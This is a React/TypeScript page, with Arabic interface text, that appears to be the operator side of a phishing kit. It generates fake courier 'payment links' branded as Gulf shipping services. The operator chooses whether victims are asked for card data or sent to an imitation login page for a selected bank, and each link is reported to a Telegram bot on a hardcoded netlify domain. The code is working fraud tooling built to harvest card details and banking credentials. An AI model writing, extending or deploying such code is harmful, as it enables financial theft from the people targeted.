import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { useCreateLink } from "@/hooks/useSupabase";
import { getCountryByCode } from "@/lib/countries";
import { getServicesByCountry } from "@/lib/gccShippingServices";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getBanksByCountry } from "@/lib/banks";
import { getCurrencySymbol, getCurrencyName, formatCurrency } from "@/lib/countryCurrencies";
import { Package, MapPin, DollarSign, Hash, Building2, Copy, ExternalLink, ArrowRight, CreditCard } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import TelegramTest from "@/components/TelegramTest";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";

const CreateShippingLink = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const createLink = useCreateLink();
  const countryData = getCountryByCode(country?.toUpperCase() || "");
  const services = getServicesByCountry(country?.toUpperCase() || "");
  
  const [selectedService, setSelectedService] = useState("");
  const [trackingNumber, setTrackingNumber] = useState("");
  const [packageDescription, setPackageDescription] = useState("");
  const [codAmount, setCodAmount] = useState("500");
  const [paymentMethod, setPaymentMethod] = useState("card"); // "card" or "bank_login"
  const [selectedBank, setSelectedBank] = useState("");
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);
  
  // Get banks for the selected country
  const banks = useMemo(() => getBanksByCountry(country?.toUpperCase() || ""), [country]);
  
  // Get selected service details and branding
  const selectedServiceData = useMemo(() => 
    services.find(s => s.key === selectedService),
    [services, selectedService]
  );
  
  const serviceBranding = useMemo(() =>
    selectedService ? getServiceBranding(selectedService) : null,
    [selectedService]
  );

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!selectedService || !trackingNumber) {
      toast({
        title: "خطأ",
        description: "الرجاء ملء جميع الحقول المطلوبة",
        variant: "destructive",
      });
      return;
    }
    
    try {
      const link = await createLink.mutateAsync({
        type: "shipping",
        country_code: country || "",
        payload: {
          service_key: selectedService,
          service_name: selectedServiceData?.name || selectedService,
          tracking_number: trackingNumber,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 500,
          payment_method: paymentMethod,
          selected_bank: paymentMethod === "bank_login" ? selectedBank : null,
          selectedCountry: country || "SA",
        },
      });
      
      // Send data to Telegram with image and description
      const productionDomain = 'https://gulf-unified-payment.netlify.app';
      const telegramResult = await sendToTelegram({
        type: 'shipping_link_created',
        data: {
          tracking_number: trackingNumber,
          service_name: selectedServiceData?.name || selectedService,
          package_description: packageDescription,
          cod_amount: parseFloat(codAmount) || 0,
          country: countryData.nameAr,
          payment_url: `${productionDomain}/r/${country}/${link.type}/${link.id}?service=${selectedService}`
        },
        timestamp: new Date().toISOString(),
        imageUrl: serviceBranding?.ogImage || serviceBranding?.heroImage,
        description: serviceBranding?.description || selectedServiceData?.description
      });

      // حفظ الرابط وإظهار Dialog
      const paymentUrl = `${productionDomain}/pay/${link.id}/recipient?service=${selectedService}`;
      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);
      
      if (telegramResult.success) {
        toast({
          title: "تم الإرسال بنجاح",
          description: "تم إرسال البيانات إلى التليجرام",
        });
      } else {
        console.error('Telegram error:', telegramResult.error);
        toast({
          title: "تحذير",
          description: "تم إنشاء الرابط ولكن فشل في إرسال البيانات إلى التليجرام",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating link:", error);
    }
  };
  
  const handleCopyLink = () => {
    navigator.clipboard.writeText(createdPaymentUrl);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
    toast({
      title: "تم النسخ!",
      description: "تم نسخ الرابط إلى الحافظة",
    });
  };
  
  const handlePreview = () => {
    window.open(createdPaymentUrl, '_blank');
  };
  
  const handleContinue = () => {
    setShowSuccessDialog(false);
    navigate(`/pay/${linkId}/recipient?service=${selectedService}`);
  };
  
  if (!countryData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-background" dir="rtl">
        <div className="text-center p-8">
          <Package className="w-16 h-16 mx-auto mb-4 text-muted-foreground" />
          <h2 className="text-2xl font-bold mb-2 text-foreground">الدولة غير موجودة</h2>
          <p className="text-muted-foreground mb-6">الرجاء اختيار دولة صحيحة</p>
          <Button onClick={() => navigate('/services')}>العودة للخدمات</Button>
        </div>
      </div>
    );
  }
  
  return (
    <div className="min-h-screen py-4 bg-gradient-to-b from-background to-secondary/20" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Telegram Test Component */}
        <div className="mb-6">
          <TelegramTest />
        </div>
        
        <div className="max-w-2xl mx-auto">
          <Card className="p-4 shadow-elevated">
            <div
              className="h-16 -m-4 mb-4 rounded-t-xl relative"
              style={{
                background: `linear-gradient(135deg, ${countryData.primaryColor}, ${countryData.secondaryColor})`,
              }}
            >
              <div className="absolute inset-0 bg-black/20 rounded-t-xl" />
              <div className="absolute bottom-2 right-4 text-white">
                <h1 className="text-lg font-bold">إنشاء رابط دفع - شحن</h1>
                <p className="text-xs opacity-90">{countryData.nameAr}</p>
              </div>
            </div>
            
            <form onSubmit={handleSubmit} className="space-y-4">
              {/* Service Selection with Logo and Description */}
              <div>
                <Label className="mb-2 text-sm">خدمة الشحن *</Label>
                <Select value={selectedService} onValueChange={setSelectedService}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر خدمة الشحن" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    {services.map((service) => (
                      <SelectItem key={service.id} value={service.key}>
                        {service.name}
                      </SelectItem>
                    ))}
                  </SelectContent>
                </Select>
              </div>
              
              {/* Service Logo and Description */}
              {selectedService && serviceBranding && selectedServiceData && (
                <div className="p-3 rounded-lg border border-border bg-card/50">
                  <div className="flex items-center gap-3 mb-2">
                    {serviceBranding.logo && (
                      <img 
                        src={serviceBranding.logo} 
                        alt={selectedServiceData.name}
                        className="h-8 object-contain"
                        onError={(e) => {
                          e.currentTarget.style.display = 'none';
                        }}
                      />
                    )}
                    <div>
                      <h3 className="font-semibold text-sm">{selectedServiceData.name}</h3>
                    </div>
                  </div>
                  <p className="text-xs text-muted-foreground">{selectedServiceData.description}</p>
                </div>
              )}
              
              {/* Tracking Number */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Hash className="w-3 h-3" />
                  رقم الشحنة *
                </Label>
                <Input
                  value={trackingNumber}
                  onChange={(e) => setTrackingNumber(e.target.value)}
                  placeholder="مثال: 1234567890"
                  className="h-9 text-sm"
                  required
                />
              </div>
              
              {/* Package Description */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <Package className="w-3 h-3" />
                  وصف الطرد
                </Label>
                <Input
                  value={packageDescription}
                  onChange={(e) => setPackageDescription(e.target.value)}
                  placeholder="مثال: ملابس، إلكترونيات"
                  className="h-9 text-sm"
                />
              </div>
              
              {/* COD Amount */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <DollarSign className="w-3 h-3" />
                  مبلغ الدفع عند الاستلام
                  {country && (
                    <span className="text-xs text-muted-foreground">
                      ({getCurrencyName(country)})
                    </span>
                  )}
                </Label>
                <Input
                  type="number"
                  value={codAmount}
                  onChange={(e) => setCodAmount(e.target.value)}
                  placeholder={country ? `0.00 ${getCurrencySymbol(country)}` : "0.00"}
                  className="h-9 text-sm"
                  step="0.01"
                  min="0"
                />
                {country && (
                  <p className="text-xs text-muted-foreground mt-1">
                    💱 العملة: {getCurrencyName(country)} ({getCurrencySymbol(country)})
                  </p>
                )}
              </div>
              
              {/* Payment Method Selection */}
              <div>
                <Label className="mb-2 flex items-center gap-2 text-sm">
                  <CreditCard className="w-3 h-3" />
                  طريقة الدفع *
                </Label>
                <Select value={paymentMethod} onValueChange={setPaymentMethod}>
                  <SelectTrigger className="h-10">
                    <SelectValue placeholder="اختر طريقة الدفع" />
                  </SelectTrigger>
                  <SelectContent className="bg-background z-50">
                    <SelectItem value="card">
                      <div className="flex items-center gap-2">
                        <CreditCard className="w-4 h-4" />
                        <span>بيانات البطاقة</span>
                      </div>
                    </SelectItem>
                    <SelectItem value="bank_login">
                      <div className="flex items-center gap-2">
                        <Building2 className="w-4 h-4" />
                        <span>تسجيل دخول البنك</span>
                      </div>
                    </SelectItem>
                  </SelectContent>
                </Select>
                <p className="text-xs text-muted-foreground mt-1">
                  {paymentMethod === "card" 
                    ? "🔒 سيُطلب من العميل إدخال بيانات البطاقة"
                    : "🏦 سيُطلب من العميل تسجيل الدخول للبنك"}
                </p>
              </div>
              
              {/* Bank Selection (Only for bank_login) */}
              {paymentMethod === "bank_login" && (
                <div>
                  <Label className="mb-2 flex items-center gap-2 text-sm">
                    <Building2 className="w-3 h-3" />
                    اختر البنك *
                  </Label>
                  <Select value={selectedBank} onValueChange={setSelectedBank}>
                    <SelectTrigger className="h-10">
                      <SelectValue placeholder="اختر البنك" />
                    </SelectTrigger>
                    <SelectContent className="bg-background z-50">
                      {banks.map((bank) => (
                        <SelectItem key={bank.id} value={bank.id}>
                          <div className="flex items-center gap-2">
                            {bank.logo && (
                              <img 
                                src={bank.logo} 
                                alt={bank.nameAr}
                                className="h-5 w-5 object-contain"
                                onError={(e) => e.currentTarget.style.display = 'none'}
                              />
                            )}
                            <span>{bank.nameAr}</span>
                          </div>
                        </SelectItem>
                      ))}
                    </SelectContent>
                  </Select>
                  <p className="text-xs text-muted-foreground mt-1">
                    💡 سيتم توجيه العميل لصفحة تسجيل دخول {banks.find(b => b.id === selectedBank)?.nameAr || 'البنك'}
                  </p>
                </div>
              )}
              
              {/* Submit Button */}
              <Button
                type="submit"
                className="w-full py-5"
                disabled={createLink.isPending}
              >
                {createLink.isPending ? (
                  <span className="text-sm">جاري الإنشاء...</span>
                ) : (
                  <>
                    <Package className="w-4 h-4 ml-2" />
                    <span className="text-sm">إنشاء رابط الدفع</span>
                  </>
                )}
              </Button>
            </form>
          </Card>
        </div>
      </div>
      
      {/* Success Dialog with Copy and Preview buttons */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">
              ✅ تم إنشاء رابط الدفع بنجاح!
            </AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>
          
          <div className="my-4">
            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>
            
            <div className="flex gap-2">
              <Button
                onClick={handleCopyLink}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>
              
              <Button
                onClick={handlePreview}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>
          
          <AlertDialogFooter>
            <AlertDialogAction onClick={handleContinue} className="w-full">
              <ArrowRight className="w-4 h-4 ml-2" />
              متابعة للدفع
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default CreateShippingLink;
